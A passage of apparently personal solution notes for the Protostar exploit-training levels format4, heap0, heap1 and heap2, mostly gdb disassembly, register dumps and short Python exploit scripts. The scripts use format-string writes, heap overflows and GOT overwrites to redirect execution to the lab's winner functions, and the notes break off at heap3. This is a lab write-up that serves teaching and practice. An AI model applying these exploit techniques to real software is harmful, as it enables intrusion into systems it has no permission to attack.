0x0804850f <vuln+61>:	call   0x80483ec <exit@plt>
```

```python
#!/usr/bin/env python

import struct

EXITPLT=0x8049724
HELLO=0x080484b4

PAYLOAD = ""
PAYLOAD += struct.pack("I", EXITPLT)
PAYLOAD += struct.pack("I", EXITPLT+2)
PAYLOAD += "%33964x" # 84b4
PAYLOAD += "%4$hn"
PAYLOAD += "%33616x" # 10804
PAYLOAD += "%5$hn"

print(PAYLOAD)
```

```sh
user@protostar:/tmp$ rm core.*;./exploit.py > payload ; ./format4 < payload
...
                         b7fd8420
code execution redirected! you win
user@protostar:/tmp$ cat payload |/opt/protostar/bin/format4
...
                         b7fd8420
code execution redirected! you win
```

# heap0

```sh
(gdb) disassemble main
Dump of assembler code for function main:
0x0804848c <main+0>:	push   ebp
0x0804848d <main+1>:	mov    ebp,esp
0x0804848f <main+3>:	and    esp,0xfffffff0
0x08048492 <main+6>:	sub    esp,0x20
0x08048495 <main+9>:	mov    DWORD PTR [esp],0x40
0x0804849c <main+16>:	call   0x8048388 <malloc@plt>
0x080484a1 <main+21>:	mov    DWORD PTR [esp+0x18],eax
0x080484a5 <main+25>:	mov    DWORD PTR [esp],0x4
0x080484ac <main+32>:	call   0x8048388 <malloc@plt>
0x080484b1 <main+37>:	mov    DWORD PTR [esp+0x1c],eax
0x080484b5 <main+41>:	mov    edx,0x8048478
0x080484ba <main+46>:	mov    eax,DWORD PTR [esp+0x1c]
0x080484be <main+50>:	mov    DWORD PTR [eax],edx
0x080484c0 <main+52>:	mov    eax,0x80485f7
0x080484c5 <main+57>:	mov    edx,DWORD PTR [esp+0x1c]
0x080484c9 <main+61>:	mov    DWORD PTR [esp+0x8],edx
0x080484cd <main+65>:	mov    edx,DWORD PTR [esp+0x18]
0x080484d1 <main+69>:	mov    DWORD PTR [esp+0x4],edx
0x080484d5 <main+73>:	mov    DWORD PTR [esp],eax
0x080484d8 <main+76>:	call   0x8048378 <printf@plt>
0x080484dd <main+81>:	mov    eax,DWORD PTR [ebp+0xc]
0x080484e0 <main+84>:	add    eax,0x4
0x080484e3 <main+87>:	mov    eax,DWORD PTR [eax]
0x080484e5 <main+89>:	mov    edx,eax
0x080484e7 <main+91>:	mov    eax,DWORD PTR [esp+0x18]
0x080484eb <main+95>:	mov    DWORD PTR [esp+0x4],edx
0x080484ef <main+99>:	mov    DWORD PTR [esp],eax
0x080484f2 <main+102>:	call   0x8048368 <strcpy@plt>
0x080484f7 <main+107>:	mov    eax,DWORD PTR [esp+0x1c]
0x080484fb <main+111>:	mov    eax,DWORD PTR [eax]
0x080484fd <main+113>:	call   eax
0x080484ff <main+115>:	leave  
0x08048500 <main+116>:	ret    
End of assembler dump.
(gdb) r $(python -c 'print "A"*200')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/protostar/bin/heap0 $(python -c 'print "A"*200')
data is at 0x804a008, fp is at 0x804a050

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) i reg
eax            0x41414141	1094795585
ecx            0x0	0
edx            0xc9	201
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff6bc	0xbffff6bc
ebp            0xbffff6e8	0xbffff6e8
esi            0x0	0
edi            0x0	0
eip            0x41414141	0x41414141
eflags         0x200246	[ PF ZF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) r $(python -c 'print "A"*100')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/protostar/bin/heap0 $(python -c 'print "A"*100')
data is at 0x804a008, fp is at 0x804a050

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) i reg
eax            0x41414141	1094795585
ecx            0x0	0
edx            0x65	101
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff72c	0xbffff72c
ebp            0xbffff758	0xbffff758
esi            0x0	0
edi            0x0	0
eip            0x41414141	0x41414141
eflags         0x200246	[ PF ZF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) r $(python -c 'print "A"*50')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/protostar/bin/heap0 $(python -c 'print "A"*50')
data is at 0x804a008, fp is at 0x804a050
level has not been passed

Program exited with code 032.
(gdb) i reg
The program has no registers now.
(gdb) r $(python -c 'print "A"*70')
Starting program: /opt/protostar/bin/heap0 $(python -c 'print "A"*70')
data is at 0x804a008, fp is at 0x804a050
level has not been passed

Program exited with code 032.
(gdb) r $(python -c 'print "A"*80')
Starting program: /opt/protostar/bin/heap0 $(python -c 'print "A"*80')
data is at 0x804a008, fp is at 0x804a050

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) r $(python -c 'print "A"*72')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/protostar/bin/heap0 $(python -c 'print "A"*72')
data is at 0x804a008, fp is at 0x804a050

Program received signal SIGSEGV, Segmentation fault.
0x08048418 in __do_global_dtors_aux ()
(gdb) i reg
eax            0x8048401	134513665
ecx            0x0	0
edx            0x49	73
ebx            0xedff5ffc	-302030852
esp            0xbffff73c	0xbffff73c
ebp            0xbffff768	0xbffff768
esi            0x0	0
edi            0x0	0
eip            0x8048418	0x8048418 <__do_global_dtors_aux+56>
eflags         0x200202	[ IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) r $(python -c 'print "A"*74')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/protostar/bin/heap0 $(python -c 'print "A"*74')
data is at 0x804a008, fp is at 0x804a050

Program received signal SIGSEGV, Segmentation fault.
0x08004141 in ?? ()
(gdb) r $(python -c 'print "A"*76')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/protostar/bin/heap0 $(python -c 'print "A"*76')
data is at 0x804a008, fp is at 0x804a050

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) i reg
eax            0x41414141	1094795585
ecx            0x0	0
edx            0x4d	77
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff73c	0xbffff73c
ebp            0xbffff768	0xbffff768
esi            0x0	0
edi            0x0	0
eip            0x41414141	0x41414141
eflags         0x200246	[ PF ZF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) r $(python -c 'print "A"*72+"BBBB"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/protostar/bin/heap0 $(python -c 'print "A"*72+"BBBB"')
data is at 0x804a008, fp is at 0x804a050

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) i reg
eax            0x42424242	1111638594
ecx            0x0	0
edx            0x4d	77
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff73c	0xbffff73c
ebp            0xbffff768	0xbffff768
esi            0x0	0
edi            0x0	0
eip            0x42424242	0x42424242
eflags         0x200246	[ PF ZF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) p &winner
$3 = (void (*)(void)) 0x8048464 <winner>
(gdb) r $(python -c 'print "A"*72+"\x64\x84\x04\x08"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/protostar/bin/heap0 $(python -c 'print "A"*72+"\x64\x84\x04\x08"')
data is at 0x804a008, fp is at 0x804a050
level passed

Program exited with code 015.
```

# heap1

```sh
(gdb) disassemble main
Dump of assembler code for function main:
0x080484b9 <main+0>:	push   ebp
0x080484ba <main+1>:	mov    ebp,esp
0x080484bc <main+3>:	and    esp,0xfffffff0
0x080484bf <main+6>:	sub    esp,0x20
0x080484c2 <main+9>:	mov    DWORD PTR [esp],0x8
0x080484c9 <main+16>:	call   0x80483bc <malloc@plt>
0x080484ce <main+21>:	mov    DWORD PTR [esp+0x14],eax
0x080484d2 <main+25>:	mov    eax,DWORD PTR [esp+0x14]
0x080484d6 <main+29>:	mov    DWORD PTR [eax],0x1
0x080484dc <main+35>:	mov    DWORD PTR [esp],0x8
0x080484e3 <main+42>:	call   0x80483bc <malloc@plt>
0x080484e8 <main+47>:	mov    edx,eax
0x080484ea <main+49>:	mov    eax,DWORD PTR [esp+0x14]
0x080484ee <main+53>:	mov    DWORD PTR [eax+0x4],edx
0x080484f1 <main+56>:	mov    DWORD PTR [esp],0x8
0x080484f8 <main+63>:	call   0x80483bc <malloc@plt>
0x080484fd <main+68>:	mov    DWORD PTR [esp+0x18],eax
0x08048501 <main+72>:	mov    eax,DWORD PTR [esp+0x18]
0x08048505 <main+76>:	mov    DWORD PTR [eax],0x2
0x0804850b <main+82>:	mov    DWORD PTR [esp],0x8
0x08048512 <main+89>:	call   0x80483bc <malloc@plt>
0x08048517 <main+94>:	mov    edx,eax
0x08048519 <main+96>:	mov    eax,DWORD PTR [esp+0x18]
0x0804851d <main+100>:	mov    DWORD PTR [eax+0x4],edx
0x08048520 <main+103>:	mov    eax,DWORD PTR [ebp+0xc]
0x08048523 <main+106>:	add    eax,0x4
---Type <return> to continue, or q <return> to quit---
0x08048526 <main+109>:	mov    eax,DWORD PTR [eax]
0x08048528 <main+111>:	mov    edx,eax
0x0804852a <main+113>:	mov    eax,DWORD PTR [esp+0x14]
0x0804852e <main+117>:	mov    eax,DWORD PTR [eax+0x4]
0x08048531 <main+120>:	mov    DWORD PTR [esp+0x4],edx
0x08048535 <main+124>:	mov    DWORD PTR [esp],eax
0x08048538 <main+127>:	call   0x804838c <strcpy@plt>
0x0804853d <main+132>:	mov    eax,DWORD PTR [ebp+0xc]
0x08048540 <main+135>:	add    eax,0x8
0x08048543 <main+138>:	mov    eax,DWORD PTR [eax]
0x08048545 <main+140>:	mov    edx,eax
0x08048547 <main+142>:	mov    eax,DWORD PTR [esp+0x18]
0x0804854b <main+146>:	mov    eax,DWORD PTR [eax+0x4]
0x0804854e <main+149>:	mov    DWORD PTR [esp+0x4],edx
0x08048552 <main+153>:	mov    DWORD PTR [esp],eax
0x08048555 <main+156>:	call   0x804838c <strcpy@plt>
0x0804855a <main+161>:	mov    DWORD PTR [esp],0x804864b
0x08048561 <main+168>:	call   0x80483cc <puts@plt>
0x08048566 <main+173>:	leave  
0x08048567 <main+174>:	ret    
End of assembler dump.
(gdb) break *0x08048561
Breakpoint 2 at 0x8048561: file heap1/heap1.c, line 34.
(gdb) r AAAA BBBBB
Starting program: /opt/protostar/bin/heap1 AAAA BBBBB

Breakpoint 2, 0x08048561 in main (argc=3, argv=0xbffff854) at heap1/heap1.c:34
34	in heap1/heap1.c
(gdb) set {int}0x8049774 = 0x8048494
(gdb) c
Continuing.
and we have a winner @ 1496352719

Program exited with code 042.


0x804835c puts@plt -> 0x8049774

(gdb) set {int}0x8049774 = 0x8048494
(gdb) c
Continuing.
and we have a winner @ 1496352648

....

(gdb) r $(python -c 'print "AAAAAAAAAAAAAAAAAAAA\x74\x97\x04\x08"') $(python -c 'print "\x94\x84\x04\x08"')
Starting program: /opt/protostar/bin/heap1 $(python -c 'print "AAAAAAAAAAAAAAAAAAAA\x74\x97\x04\x08"') $(python -c 'print "\x94\x84\x04\x08"')
and we have a winner @ 1496355386
```

```python
#!/usr/bin/env python

import struct

PUTSPLT = 0x8049774
WINNER = 0x8048494

# Use strcpy to copy argv[2] to PUTS@PLT
PAYLOAD = ""
PAYLOAD += "A"*20
PAYLOAD += struct.pack("I", PUTSPLT)
PAYLOAD += " "
PAYLOAD += struct.pack("I", WINNER)

print(PAYLOAD)
```

```sh
user@protostar:/tmp$ chmod +x heap1.py 
user@protostar:/tmp$ /opt/protostar/bin/heap1 $(/tmp/heap1.py)
and we have a winner @ 1496355641
```

# heap2

```sh
(gdb) set disassembly-flavor intel 
(gdb) disassemble main 
	Dump of assembler code for function main:
0x08048934 <main+0>:	push   ebp
0x08048935 <main+1>:	mov    ebp,esp
0x08048937 <main+3>:	and    esp,0xfffffff0
0x0804893a <main+6>:	sub    esp,0x90
0x08048940 <main+12>:	jmp    0x8048943 <main+15>
0x08048942 <main+14>:	nop
0x08048943 <main+15>:	mov    ecx,DWORD PTR ds:0x804b5f8
0x08048949 <main+21>:	mov    edx,DWORD PTR ds:0x804b5f4
0x0804894f <main+27>:	mov    eax,0x804ad70
0x08048954 <main+32>:	mov    DWORD PTR [esp+0x8],ecx
0x08048958 <main+36>:	mov    DWORD PTR [esp+0x4],edx
0x0804895c <main+40>:	mov    DWORD PTR [esp],eax
0x0804895f <main+43>:	call   0x804881c <printf@plt>
0x08048964 <main+48>:	mov    eax,ds:0x804b164
0x08048969 <main+53>:	mov    DWORD PTR [esp+0x8],eax
0x0804896d <main+57>:	mov    DWORD PTR [esp+0x4],0x80
0x08048975 <main+65>:	lea    eax,[esp+0x10]
0x08048979 <main+69>:	mov    DWORD PTR [esp],eax
0x0804897c <main+72>:	call   0x80487ac <fgets@plt>
0x08048981 <main+77>:	test   eax,eax
0x08048983 <main+79>:	jne    0x8048987 <main+83>
0x08048985 <main+81>:	leave  
0x08048986 <main+82>:	ret    
0x08048987 <main+83>:	mov    DWORD PTR [esp+0x8],0x5
0x0804898f <main+91>:	mov    DWORD PTR [esp+0x4],0x804ad8d
0x08048997 <main+99>:	lea    eax,[esp+0x10]
0x0804899b <main+103>:	mov    DWORD PTR [esp],eax
0x0804899e <main+106>:	call   0x804884c <strncmp@plt>
0x080489a3 <main+111>:	test   eax,eax
0x080489a5 <main+113>:	jne    0x8048a01 <main+205>
0x080489a7 <main+115>:	mov    DWORD PTR [esp],0x4
0x080489ae <main+122>:	call   0x804916a <malloc>
0x080489b3 <main+127>:	mov    ds:0x804b5f4,eax
0x080489b8 <main+132>:	mov    eax,ds:0x804b5f4
0x080489bd <main+137>:	mov    DWORD PTR [esp+0x8],0x4
0x080489c5 <main+145>:	mov    DWORD PTR [esp+0x4],0x0
0x080489cd <main+153>:	mov    DWORD PTR [esp],eax
0x080489d0 <main+156>:	call   0x80487bc <memset@plt>
0x080489d5 <main+161>:	lea    eax,[esp+0x10]
0x080489d9 <main+165>:	add    eax,0x5
0x080489dc <main+168>:	mov    DWORD PTR [esp],eax
0x080489df <main+171>:	call   0x80487fc <strlen@plt>
0x080489e4 <main+176>:	cmp    eax,0x1e
0x080489e7 <main+179>:	ja     0x8048a01 <main+205>
0x080489e9 <main+181>:	lea    eax,[esp+0x10]
0x080489ed <main+185>:	lea    edx,[eax+0x5]
0x080489f0 <main+188>:	mov    eax,ds:0x804b5f4
0x080489f5 <main+193>:	mov    DWORD PTR [esp+0x4],edx
0x080489f9 <main+197>:	mov    DWORD PTR [esp],eax
0x080489fc <main+200>:	call   0x804880c <strcpy@plt>
0x08048a01 <main+205>:	mov    DWORD PTR [esp+0x8],0x5
0x08048a09 <main+213>:	mov    DWORD PTR [esp+0x4],0x804ad93
0x08048a11 <main+221>:	lea    eax,[esp+0x10]
0x08048a15 <main+225>:	mov    DWORD PTR [esp],eax
0x08048a18 <main+228>:	call   0x804884c <strncmp@plt>
0x08048a1d <main+233>:	test   eax,eax
0x08048a1f <main+235>:	jne    0x8048a2e <main+250>
0x08048a21 <main+237>:	mov    eax,ds:0x804b5f4
0x08048a26 <main+242>:	mov    DWORD PTR [esp],eax
0x08048a29 <main+245>:	call   0x804999c <free>
0x08048a2e <main+250>:	mov    DWORD PTR [esp+0x8],0x6
0x08048a36 <main+258>:	mov    DWORD PTR [esp+0x4],0x804ad99
0x08048a3e <main+266>:	lea    eax,[esp+0x10]
0x08048a42 <main+270>:	mov    DWORD PTR [esp],eax
0x08048a45 <main+273>:	call   0x804884c <strncmp@plt>
0x08048a4a <main+278>:	test   eax,eax
0x08048a4c <main+280>:	jne    0x8048a62 <main+302>
0x08048a4e <main+282>:	lea    eax,[esp+0x10]
0x08048a52 <main+286>:	add    eax,0x7
0x08048a55 <main+289>:	mov    DWORD PTR [esp],eax
0x08048a58 <main+292>:	call   0x804886c <strdup@plt>
0x08048a5d <main+297>:	mov    ds:0x804b5f8,eax
0x08048a62 <main+302>:	mov    DWORD PTR [esp+0x8],0x5
0x08048a6a <main+310>:	mov    DWORD PTR [esp+0x4],0x804ada1
0x08048a72 <main+318>:	lea    eax,[esp+0x10]
0x08048a76 <main+322>:	mov    DWORD PTR [esp],eax
0x08048a79 <main+325>:	call   0x804884c <strncmp@plt>
0x08048a7e <main+330>:	test   eax,eax
0x08048a80 <main+332>:	jne    0x8048942 <main+14>
0x08048a86 <main+338>:	mov    eax,ds:0x804b5f4
0x08048a8b <main+343>:	mov    eax,DWORD PTR [eax+0x20]
0x08048a8e <main+346>:	test   eax,eax
0x08048a90 <main+348>:	je     0x8048aa3 <main+367>
0x08048a92 <main+350>:	mov    DWORD PTR [esp],0x804ada7
0x08048a99 <main+357>:	call   0x804883c <puts@plt>
0x08048a9e <main+362>:	jmp    0x8048943 <main+15>
0x08048aa3 <main+367>:	mov    DWORD PTR [esp],0x804adc3
0x08048aaa <main+374>:	call   0x804883c <puts@plt>
0x08048aaf <main+379>:	jmp    0x8048943 <main+15>
End of assembler dump.
(gdb) r
Starting program: /opt/protostar/bin/heap2 
[ auth = (nil), service = (nil) ]
auth AAAABBBB
[ auth = 0x804c008, service = (nil) ]
service BBBBCCCCDDDDEEEEFFFF
[ auth = 0x804c008, service = 0x804c018 ]
login
you have logged in already!
[ auth = 0x804c008, service = 0x804c018 ]
^C
Program received signal SIGINT, Interrupt.
0xb7f53c1e in __read_nocancel () at ../sysdeps/unix/syscall-template.S:82
82	../sysdeps/unix/syscall-template.S: No such file or directory.
	in ../sysdeps/unix/syscall-template.S
(gdb) x/50bx 0x804c008
0x804c008:	0x41	0x41	0x41	0x41	0x42	0x42	0x42	0x42
0x804c010:	0x0a	0x00	0x00	0x00	0x21	0x00	0x00	0x00
0x804c018:	0x20	0x42	0x42	0x42	0x42	0x43	0x43	0x43
0x804c020:	0x43	0x44	0x44	0x44	0x44	0x45	0x45	0x45
0x804c028:	0x45	0x46	0x46	0x46	0x46	0x0a	0x00	0x00
0x804c030:	0x00	0x00	0x00	0x00	0xd1	0x0f	0x00	0x00
0x804c038:	0x00	0x00
(gdb) p *auth
$6 = {name = "AAAABBBB\n\000\000\000!\000\000\000 BBBBCCCCDDDDEEE", auth = 1179010629}
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/heap2 
[ auth = (nil), service = (nil) ]
auth AAAABBBB
[ auth = 0x804c008, service = (nil) ]
^C
Program received signal SIGINT, Interrupt.
0xb7f53c1e in __read_nocancel () at ../sysdeps/unix/syscall-template.S:82
82	../sysdeps/unix/syscall-template.S: No such file or directory.
	in ../sysdeps/unix/syscall-template.S
(gdb) x/40bx 0x804c008
0x804c008:	0x41	0x41	0x41	0x41	0x42	0x42	0x42	0x42
0x804c010:	0x0a	0x00	0x00	0x00	0xf1	0x0f	0x00	0x00
0x804c018:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x804c020:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x804c028:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
(gdb) c
Continuing.
service CCCCDDDD
[ auth = 0x804c008, service = 0x804c018 ]
^C
Program received signal SIGINT, Interrupt.
0xb7f53c1e in __read_nocancel () at ../sysdeps/unix/syscall-template.S:82
82	in ../sysdeps/unix/syscall-template.S
(gdb) x/40bx 0x804c008
0x804c008:	0x41	0x41	0x41	0x41	0x42	0x42	0x42	0x42
0x804c010:	0x0a	0x00	0x00	0x00	0x11	0x00	0x00	0x00
0x804c018:	0x20	0x43	0x43	0x43	0x43	0x44	0x44	0x44
0x804c020:	0x44	0x0a	0x00	0x00	0xe1	0x0f	0x00	0x00
0x804c028:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
(gdb) x/40bx 0x804c018
0x804c018:	0x20	0x43	0x43	0x43	0x43	0x44	0x44	0x44
0x804c020:	0x44	0x0a	0x00	0x00	0xe1	0x0f	0x00	0x00
0x804c028:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x804c030:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x804c038:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
(gdb) c
Continuing.
login
please enter your password
[ auth = 0x804c008, service = 0x804c018 ]
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[ auth = 0x804c008, service = 0x804c028 ]
login
you have logged in already!
[ auth = 0x804c008, service = 0x804c028 ]
^C
Program received signal SIGINT, Interrupt.
0xb7f53c1e in __read_nocancel () at ../sysdeps/unix/syscall-template.S:82
82	in ../sysdeps/unix/syscall-template.S
(gdb) x/40bx 0x804c018
0x804c018:	0x20	0x43	0x43	0x43	0x43	0x44	0x44	0x44
0x804c020:	0x44	0x0a	0x00	0x00	0x41	0x00	0x00	0x00
0x804c028:	0x20	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x804c030:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x804c038:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
```

# heap3


info proc map
set $i1 = (struct ....)0xxxxxxxx
print *$i1
